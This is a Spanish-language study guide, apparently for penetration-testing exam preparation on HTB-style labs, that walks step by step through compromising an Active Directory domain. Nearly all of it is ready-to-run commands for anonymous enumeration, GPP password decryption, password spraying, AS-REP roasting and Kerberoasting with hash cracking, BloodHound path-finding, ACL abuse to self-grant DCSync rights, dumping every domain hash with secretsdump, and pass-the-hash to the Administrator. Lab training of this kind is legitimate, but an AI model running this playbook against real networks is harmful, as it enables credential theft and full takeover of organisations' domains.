# Guía Completa — Active Directory (de nmap a Domain Admin)

Documento único de flujo. Sigue el orden real de ataque a una máquina/set de AD (HTB, Proving Grounds, o el examen). Cada comando tiene un comentario explicando **qué hace y por qué lo corres en ese momento**, como notas de estudio.

> Reglas del examen que aplican aquí: Responder solo en modo análisis (nunca poisoning). Metasploit no sirve para pivotar. SQLMap prohibido (no aplica mucho en AD, pero recuérdalo). IA prohibida durante el examen real — esto es material de preparación.

---

## FASE 0 — Reconocimiento inicial (encontrar que es AD)

```bash
# rustscan es más rápido que nmap para el descubrimiento inicial de puertos.
# --ulimit sube el límite de archivos abiertos simultáneos para ir más rápido.
# Todo lo que va después de "--" se le pasa directo a nmap sobre los puertos que encontró.
rustscan -a <IP> --ulimit 5000 -- -sCV
```

```bash
# Si prefieres nmap puro (o rustscan no está disponible):
# -p-           → TODOS los 65535 puertos TCP, nunca te quedes solo con el top-1000
# --min-rate    → fuerza velocidad mínima de envío de paquetes (rápido)
# -T4           → timing agresivo, para labs/examen con red estable
# -Pn           → NO hacer ping antes de escanear (muchos hosts de AD bloquean ICMP
#                 y si no pones esto, nmap puede saltarse el host completo)
sudo nmap -p- --min-rate=5000 -T4 -Pn <IP> -oN nmap_allports.txt

# Detalle de servicio/versión SOLO sobre los puertos que encontraste abiertos arriba
sudo nmap -p<PUERTOS_ENCONTRADOS> -sCV -T4 -Pn <IP> -oN nmap_detail.txt
```

**Cómo saber que es Active Directory con solo mirar el nmap:** si ves estos puertos juntos, estás ante un Domain Controller:

| Puerto | Servicio | Por qué confirma AD |
|--------|----------|---------------------|
| 53 | DNS | AD suele ser su propio servidor DNS |
| 88 | Kerberos | El protocolo de autenticación del dominio — ¡es un DC! |
| 135 | MSRPC | Llamadas a procedimiento remoto de Windows |
| 139/445 | SMB | Shares de red, enumeración de usuarios |
| 389/636 | LDAP / LDAPS | El directorio en sí — aquí viven usuarios/grupos/OUs |
| 464 | kpasswd | Cambio de contraseñas vía Kerberos |
| 593 | RPC over HTTP | Variante de RPC |
| 3268/3269 | Global Catalog | Búsquedas across todo el forest, no solo un dominio |
| 5985/5986 | WinRM | Shell remota de PowerShell (tu vía de acceso más cómoda) |
| 9389 | ADWS | AD Web Services, usado por PowerShell RSAT |

```bash
# Descubrir el hostname/dominio real (necesario para casi todo lo que sigue)
nxc smb <IP>
# El output te muestra "(name:HOSTNAME) (domain:DOMINIO)" — ESO es tu dominio real,
# no lo adivines. Ejemplo real de hoy: (name:FOREST) (domain:htb.local)
```

```bash
# Agrega el DC a tu /etc/hosts INMEDIATAMENTE. Muchas herramientas de AD (Kerberos,
# bloodhound-python) fallan con errores de DNS raros si no resuelves el nombre.
echo "<IP> <HOSTNAME>.<DOMINIO> <DOMINIO> <HOSTNAME>" | sudo tee -a /etc/hosts
# Ejemplo real: echo "10.129.95.210 FOREST.htb.local htb.local FOREST" | sudo tee -a /etc/hosts
```

---

## FASE 1 — Enumeración SIN credenciales (null session / anónimo)

```bash
# Null session de SMB — a veces el AD mal configurado permite listar sin login
nxc smb <IP> -u '' -p '' --shares
nxc smb <IP> -u 'guest' -p '' --shares

# RPC anónimo — a veces revela usuarios sin ninguna credencial
rpcclient -U "" -N <IP>
# Dentro de rpcclient:
#   enumdomusers     → lista usuarios del dominio
#   enumdomgroups    → lista grupos
#   querydominfo     → info general del dominio

# Enumeración completa automatizada (combina varias técnicas de golpe)
enum4linux-ng -A <IP>

# LDAP con bind anónimo (si el DC lo permite)
ldapsearch -x -H ldap://<IP> -s base namingcontexts
# Esto te da el "base DN" del dominio, ej: DC=htb,DC=local
```

```bash
# Enumeración de shares SMB — busca shares con nombre propio (no C$/ADMIN$/IPC$)
smbclient -L //<IP>/ -N
smbclient //<IP>/<share_encontrado> -N
# Dentro de smbclient:
#   ls                → lista archivos
#   cd <carpeta>      → navega
#   get <archivo>     → descarga uno
#   prompt OFF; recurse ON; mget *   → descarga TODO recursivamente (útil si no sabes qué buscar)
```

**Qué buscar en los shares:** archivos de Group Policy (`Groups.xml` con `cpassword` cifrado — ver Fase 2), scripts de login, backups, notas de sysadmin con credenciales.

---

## FASE 2 — Explotación de hallazgos comunes SIN credenciales de dominio

### GPP / Group Policy Preferences — credenciales cifradas en Groups.xml

```bash
# Si encontraste un Groups.xml en un share (típicamente en una ruta con "Policies\"):
cat Groups.xml
# Busca el atributo cpassword="..." dentro del XML — está CIFRADO, pero con
# una clave AES que Microsoft publicó públicamente por error hace años.

# gpp-decrypt usa esa clave conocida para descifrar cualquier cpassword de GPP:
gpp-decrypt '<VALOR_DE_CPASSWORD>'
# Esto te da la contraseña en texto plano de la cuenta mencionada en el XML
# (busca el atributo "userName" del mismo XML para saber a quién pertenece)
```

### Password spraying con usuarios enumerados (cuidado con lockout)

```bash
# Si ya tienes una lista de usuarios (de RPC, LDAP, o un users.txt),
# prueba contraseñas comunes o vacías contra TODOS a la vez.
# OJO: puede bloquear cuentas si el dominio tiene política de lockout agresiva.
nxc smb <IP> -u users.txt -p ''
nxc smb <IP> -u users.txt -p 'Password123'
```

---

## FASE 3 — Ya tienes UNA credencial de dominio (foothold en AD)

Este es el momento clave: pasaste de "afuera" a "tengo user:pass válido". Todo lo que sigue parte de aquí.

```bash
# 1. Confirma DÓNDE funcionan estas credenciales, no solo que funcionan.
#    Escanea el RANGO completo, no solo el DC — en un set de AD hay más máquinas.
nxc smb <SUBNET>/24 -u '<user>' -p '<pass>'
# Busca "(Pwn3d!)" en la salida — significa que además de autenticar,
# tienes ADMIN LOCAL en esa máquina específica. Información gratis y valiosa.
```

```bash
# 2. Enumeración con credenciales — mucho más rica que la anónima
nxc smb <IP> -u '<user>' -p '<pass>' --users     # lista completa de usuarios
nxc smb <IP> -u '<user>' -p '<pass>' --groups    # grupos del dominio
nxc smb <IP> -u '<user>' -p '<pass>' --shares    # shares (con más acceso que anónimo)
```

```bash
# 3. LDAP con credenciales — mucho más detalle que el bind anónimo
# Filtro básico: usuarios Y computadoras mezclados (las de máquina terminan en $)
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(objectClass=user)" sAMAccountName -LLL

# Filtro para EXCLUIR cuentas de computadora, solo personas reales:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(!(objectClass=computer)))" sAMAccountName -LLL

# Filtro para encontrar cuentas con SPN (candidatas a Kerberoasting) SIN correr
# GetUserSPNs todavía — es una forma de anticipar el vector antes de atacar:
ldapsearch -x -H ldap://<IP> -D "<user>@<dominio>" -w '<pass>' -b "DC=<dom>,DC=<tld>" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName -LLL
```

```bash
# 4. RPC con credenciales — a veces revela usuarios que LDAP anónimo/con creds no
#    te muestra (canal distinto, SAMR en vez de LDAP). Si algo no cuadra, cruza fuentes.
rpcclient -U "<user>%<pass>" <IP> -c "enumdomusers"

# Exportar solo los nombres de usuario a un archivo limpio:
rpcclient -U "<user>%<pass>" <IP> -c "enumdomusers" | grep -oP '(?<=\[)[^\]]+(?=\] rid)' > users_rpc.txt

# LECCIÓN REAL: si una técnica (ej: AS-REP Roasting) no encuentra nada con tu
# lista de LDAP, compara contra la lista de RPC — puede haber usuarios que
# una fuente no mostró y la otra sí:
diff <(sort users_ldap.txt) <(sort users_rpc.txt)
```

---

## FASE 4 — BloodHound (el mapa completo del dominio)

### Instalación (si no la tienes)
```bash
sudo apt install bloodhound -y
bloodhound-start
# Primera vez: te pide correr bloodhound-setup (acepta con "y").
# Esto levanta Neo4j (puerto 7474 — es un paso INTERMEDIO, no la interfaz final)
# y Postgres, y te da un usuario admin + password generada para el puerto 8080.
```

### 🔴 Checklist de arranque si BloodHound no responde (esto pasó hoy y costó tiempo)
```bash
# 1. Confirma si ya está arriba antes de asumir que está colgado:
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
# 200 = ya está arriba. 000 = sigue caído, sigue con los pasos de abajo.

# 2. La causa #1 más común: Postgres "parece" activo pero no lo está.
#    systemctl status postgresql puede MENTIR diciendo "active (exited)"
#    porque ese es solo un servicio meta. Verifica la instancia REAL:
sudo pg_lsclusters
# Si la columna Status dice "down", ahí está el problema:
sudo pg_ctlcluster <VERSION_QUE_TE_MOSTRÓ> main start
# ejemplo real: sudo pg_ctlcluster 18 main start

# 3. Confirma Neo4j por separado:
ps aux | grep neo4j
sudo neo4j start    # si no hay proceso vivo

# 4. Reinicia el backend de BloodHound y confirma:
sudo systemctl restart bloodhound
curl -s http://localhost:8080/ui/login -o /dev/null -w "%{http_code}\n"
```

### Generar y subir los datos
```bash
# -d es el DOMINIO (NO -g, ese es Global Catalog y rompe la resolución DNS)
# --zip es específico de BloodHound CE, te da un solo archivo listo para subir
bloodhound-python -u <user> -p <pass> -d <dominio> -ns <DC_IP> -c all --zip
```
Sube el `.zip` en la interfaz web (`localhost:8080`) → menú lateral → ícono de subida ("Upload Files").

### Navegación — 3 pestañas
- **SEARCH**: busca tu usuario, revisa "Object Information" (¿Kerberoastable? ¿AS-REP roasteable? ¿Allows Unconstrained Delegation?) sin correr ningún comando todavía.
- **PATHFINDING**: Start Node = tu usuario, End Node = `DOMAIN ADMINS@<DOMINIO>`. Te dibuja el camino más corto con cada edge etiquetado. Más simple que Cypher.
- **CYPHER**: solo lectura en BloodHound CE (no puedes `SET` para marcar Owned — usa Pathfinding en su lugar).

```cypher
// Ver TODOS los edges de un tipo específico en todo el dominio (ej: buscar caminos de WriteDacl)
MATCH p=(n)-[:WriteDacl]->(m) RETURN p

// Todas las cuentas Kerberoastable de un vistazo
MATCH (n:User {hasspn:true}) RETURN n
```

**Cómo leer el camino que encuentres — prioriza por familia de edge, no por número de saltos:**
```
1. ACL (GenericAll, WriteDacl, WriteOwner, AddMember...) → ejecutable YA, sin depender de nada más
2. Kerberos (Kerberoastable, AS-REPRoastable) → ejecutable YA, pero depende de crackear el hash
3. Sesión (HasSession, AdminTo hacia máquina que NO controlas) → esconde trabajo previo no mostrado en el grafo
```
**Ojo con la dirección de la flecha:** un edge apuntando DESDE un grupo administrativo HACIA tu usuario es la relación normal (te administran a ti) — no es explotable. Solo importa si sale DESDE tu nodo HACIA el objetivo.

---

## FASE 5 — Ataques de Kerberos

```bash
# ── AS-REP Roasting ── (GetNPUsers, "NP" = No Preauth)
# Ataca cuentas con "Do Not Require Pre-Authentication" = TRUE.
# NO necesitas password válido si usas -usersfile con -no-pass.
impacket-GetNPUsers <dominio>/ -no-pass -usersfile users.txt -dc-ip <DC_IP>
# El hash resultante empieza con $krb5asrep$23$... → hashcat -m 18200

# ── Kerberoasting ── (GetUserSPNs, "SPN" = Service Principal Name)
# Ataca cuentas de SERVICIO (nombres tipo SVC_*) que tienen un SPN configurado.
# SÍ necesitas credenciales válidas de antemano.
impacket-GetUserSPNs <dominio>/<user>:<pass> -dc-ip <DC_IP> -request
# El hash resultante empieza con $krb5tgs$23$... → hashcat -m 13100

# REGLA MENTAL: si el nombre de cuenta suena a cuenta de servicio (SVC_algo),
# piensa primero en Kerberoasting (GetUserSPNs), no en AS-REP (GetNPUsers).
# Son ataques a vulnerabilidades DISTINTAS en cuentas DISTINTAS.
```

```bash
# Crackear el hash obtenido
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt   # AS-REP
hashcat -m 13100 kerberoast_hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt   # Kerberoast
```

---

## FASE 6 — Movimiento lateral (ya con una segunda credencial)

```bash
# ANTES de elegir herramienta, confirma qué puerto está abierto — usar la
# equivocada da un error de conexión que puede confundirse con creds malas.
nmap -p445,5985,5986 <IP>
```

```bash
# Si 5985/5986 (WinRM) abierto → evil-winrm (shell PowerShell, más cómoda)
evil-winrm -i <IP> -u <user> -p <pass>
evil-winrm -i <IP> -u <user> -H <NT_HASH>          # Pass-the-Hash

# Si 5985 CERRADO pero 445 (SMB) abierto → impacket-psexec o wmiexec
impacket-psexec  <dominio>/<user>:<pass>@<IP>      # shell cmd.exe, crea un servicio (más ruidoso)
impacket-wmiexec <dominio>/<user>:<pass>@<IP>      # shell cmd.exe, vía WMI (más discreto)
```

**Señal de alerta real:** si ves `Errno::ECONNREFUSED` en el puerto 5985 con evil-winrm, ese puerto está cerrado — cambia inmediatamente a psexec/wmiexec, no sigas reintentando.

**Otra señal de alerta real:** si WinRM SÍ conecta (ves el prompt `PS C:\>`) pero falla con `WinRMAuthorizationError` al ejecutar cualquier comando — las credenciales son correctas pero el usuario NO está en el grupo "Remote Management Users". No es un error tuyo, es que ese usuario no tiene autorización real de ejecución ahí. Busca otro camino (BloodHound de nuevo con esta cuenta).

**Otra señal de alerta real:** si 2+ protocolos distintos (SMB, LDAP, WinRM) rechazan la MISMA credencial de forma consistente con `LOGON_FAILURE` — sospecha de un error de tipeo/copia en el password, no de configuración rara de la máquina. Reescribe el password a mano, sin copiar/pegar.

---

## FASE 7 — Enumeración nativa desde dentro (plan B sin nxc/impacket)

Útil si el firewall solo deja pasar RDP, o quieres confirmar algo desde la perspectiva nativa del usuario.

```bash
xfreerdp /u:<user> /d:<dominio> /v:<IP_cliente> +clipboard
# Si da error de Kerberos "Cannot contact any KDC", es problema de DNS:
# agrega el DC a tu /etc/hosts (ver Fase 0) y reintenta.
```

```cmd
:: Usuarios y grupos DEL DOMINIO (no confundir con lo de abajo)
net user /domain
net group "Domain Admins" /domain

:: Usuarios y grupos LOCALES de la máquina donde estás parado (¡distinto!)
net user
net localgroup administrators
```
> **Confusión real que pasó hoy:** buscar un usuario con `net user` (sin `/domain`) solo muestra cuentas locales de ESA máquina específica, no del dominio. Si buscas un usuario y no aparece, puede ser una cuenta local de OTRA máquina.

```powershell
# LDAP nativo vía ADSI (sin necesitar módulos externos como PowerView)
[ADSI]"LDAP://<dominio>/DC=<dom>,DC=<tld>"

# Consulta con filtro, más útil:
$searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://<dominio>/DC=<dom>,DC=<tld>")
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | ForEach-Object { $_.Properties["samaccountname"] }
```
> Recuerda: `[System...]` es sintaxis de PowerShell, NO de cmd.exe. Si tu prompt dice `C:\Users\...>` (sin "PS" adelante), primero escribe `powershell` para entrar al shell correcto.

---

## FASE 8 — Escalada por cadena de ACL (cuando BloodHound muestra varios saltos de grupo)

Caso real: tu usuario no tiene un ACL directo sobre el dominio, sino una cadena de membresías anidadas que termina en un grupo con WriteDacl sobre el dominio.

```
tu_usuario → MemberOf → Grupo A → MemberOf → Grupo B
   → GenericAll → Grupo C (ej: "Exchange Windows Permissions")
   → WriteDacl → EL DOMINIO
```

```bash
# Paso 1 — únete al grupo intermedio que tiene el WriteDacl
net rpc group addmem "<GRUPO>" "<tu_usuario>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>

# SIEMPRE verifica que de verdad se aplicó — net rpc puede fallar SIN mostrar error:
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

```bash
# Si tu usuario NO aparece en la lista de miembros, net rpc falló silenciosamente
# (pasa cuando el privilegio viene de membresía anidada, no de un permiso directo).
# Alternativa que sí funciona: LDAP directo.

# 1. Confirma el DN exacto del grupo objetivo:
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(cn=<GRUPO>)" distinguishedName

# 2. Confirma el DN exacto de tu propio usuario:
ldapsearch -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -b "DC=<dom>,DC=<tld>" "(sAMAccountName=<tu_usuario>)" distinguishedName

# 3. Construye el LDIF con AMBOS DN exactos (no asumas la OU, siempre verifica)
cat <<EOF > add_member.ldif
dn: <DN_EXACTO_DEL_GRUPO>
changetype: modify
add: member
member: <DN_EXACTO_DE_TU_USUARIO>
EOF

# 4. Aplica el cambio
ldapmodify -x -H ldap://<DC_IP> -D "<tu_usuario>@<dominio>" -w '<tu_pass>' -f add_member.ldif

# 5. Verifica de nuevo
net rpc group members "<GRUPO>" -U "<dominio>/<tu_usuario>%<tu_pass>" -S <DC_IP>
```

```bash
# Paso 2 — auto-concédete DCSync (INMEDIATAMENTE después del paso 1, sin esperar)
# LECCIÓN REAL: la membresía de grupo puede tardar en propagarse, o revertirse.
# Si esto falla la primera vez con INSUFF_ACCESS_RIGHTS, repite el Paso 1 y
# ejecuta esto justo después, sin dejar pasar tiempo entre medio.
impacket-dacledit -action write -rights DCSync -principal <tu_usuario> -target-dn "DC=<dom>,DC=<tld>" <dominio>/<tu_usuario>:<tu_pass> -dc-ip <DC_IP>
# Éxito esperado: "[*] DACL modified successfully!"
```

> **Si `impacket-dacledit` falla con un traceback largo de Python** (menciona `cryptography.hazmat`, `aioquic`, `service_identity`) — es un conflicto de versiones de librerías por haber instalado otra herramienta antes (ej: bloodyAD), NO un error de tu comando. No persigas versiones exactas a mano, usa un entorno aislado:
> ```bash
> python3 -m venv ~/venv-impacket
> source ~/venv-impacket/bin/activate
> pip install impacket
> # corre impacket-dacledit aquí dentro
> deactivate   # cuando termines, para volver a tu Python normal
> ```

---

## FASE 9 — DCSync (el golpe final)

```bash
# Requiere los permisos GetChanges + GetChangesAll sobre el dominio
# (confirmados en BloodHound como edge DCSync, o recién auto-concedidos en Fase 8)
impacket-secretsdump -just-dc <dominio>/<user>:<pass>@<DC_IP>
```
**Si da `ERROR_DS_DRA_BAD_DN`:** casi siempre significa que los permisos de DCSync todavía no están bien aplicados — vuelve a la Fase 8, Paso 2, no es un error de sintaxis de este comando.

Esto vuelca TODOS los hashes del dominio. Busca la línea:
```
<dominio>\Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HASH_NTLM>:::
```

**Alternativa — solo una cuenta específica (más rápido, menos ruido):**
```bash
impacket-secretsdump -just-dc-user Administrator <dominio>/<user>:<pass>@<DC_IP>
```

---

## FASE 10 — Pass-the-Hash final y captura de flags

```bash
# Con el hash del Administrator, autentícate SIN necesitar la password en texto plano
evil-winrm -i <DC_IP> -u Administrator -H <NT_HASH>
# Si WinRM no coopera (poco probable ya con Administrator real):
impacket-psexec <dominio>/Administrator@<DC_IP> -hashes :<NT_HASH>
```

```cmd
:: Recuerda: estás en cmd.exe/PowerShell de Windows, NO en bash
:: cat NO existe en cmd → usa type
:: ls NO es nativo de cmd → usa dir
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\<usuario_inicial>\Desktop\user.txt

:: Si una flag "no es aceptada" al enviarla, sospecha de caracteres invisibles
:: al copiar (pasó hoy). Verifica los bytes exactos:
certutil -encodehex C:\Users\Administrator\Desktop\root.txt tmp.hex
type tmp.hex
```

---

## Resumen del flujo completo (para memorizar la forma, no cada comando)

```
nmap/rustscan (identificar puertos AD: 88,389,445,5985...)
   → enumeración SIN creds (null session, RPC anónimo, shares)
   → ¿encontraste GPP/Groups.xml? → gpp-decrypt → credencial #1
   → enumeración CON creds (nxc, LDAP, RPC) + BloodHound
   → priorizar camino: ACL > Kerberos > Sesión
   → ejecutar la técnica del camino elegido → nueva credencial/acceso
   → movimiento lateral (evil-winrm / psexec / wmiexec, según puerto)
   → repetir BloodHound con el nuevo contexto si hace falta
   → DCSync (directo si ya tienes el edge, o vía cadena ACL si no)
   → Pass-the-Hash al DC con el hash del Administrator
   → flags (user.txt / root.txt / proof.txt)
```
